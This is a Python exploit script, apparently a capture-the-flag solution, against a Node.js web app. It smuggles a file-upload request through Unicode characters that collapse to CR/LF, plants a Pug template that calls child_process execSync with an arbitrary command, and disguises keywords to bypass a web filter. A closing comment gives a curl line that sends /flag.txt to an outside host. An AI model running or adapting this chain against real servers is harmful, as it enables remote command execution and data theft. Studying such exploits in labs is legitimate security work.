import requests
import sys

payloadRaw = """x HTTP/1.1

POST /file_upload HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942
Content-Length: 6279
Origin: http://localhost:8081
Connection: close
Referer: http://localhost:8081/?action=upload
Upgrade-Insecure-Requests: 1

-----------------------------12837266501973088788260782942
Content-Disposition: form-data; name="file"; filename="5am3_get_flag.pug"
Content-Type: ../template

- global.process.mainModule.require('child_process').execSync('evalcmd')
-----------------------------12837266501973088788260782942--


"""

def getParm(payload):
    payload = payload.replace(" ","%C4%A0")
    payload = payload.replace("\n","%C4%8D%C4%8A")
    payload = payload.replace("\"","%C4%A2")
    payload = payload.replace("'","%C4%A7")
    payload = payload.replace("`","%C5%A0")
    payload = payload.replace("!","%C4%A1")

    payload = payload.replace("+","%2B")
    payload = payload.replace(";","%3B")
    payload = payload.replace("&","%26")

    # Bypass Waf 
    payload = payload.replace("global","%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC")
    payload = payload.replace("process","%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3")
    payload = payload.replace("mainModule","%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5")
    payload = payload.replace("require","%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5")
    payload = payload.replace("root","%C5%B2%C5%AF%C5%AF%C5%B4")
    payload = payload.replace("child_process","%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5%9F%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3")
    payload = payload.replace("exec","%C5%A5%C5%B8%C5%A5%C5%A3")
    
    return payload

def run(url,cmd):
    payloadC =  payloadRaw.replace("evalcmd",cmd)
    urlC = url+"/core?q="+getParm(payloadC)
    requests.get(urlC)
    
    requests.get(url+"/?action=5am3_get_flag").text

if __name__ == '__main__':
    targetUrl = sys.argv[1]
    cmd = sys.argv[2]
    print run(targetUrl,cmd)

# curl eval.com -X POST -d `cat /flag.txt`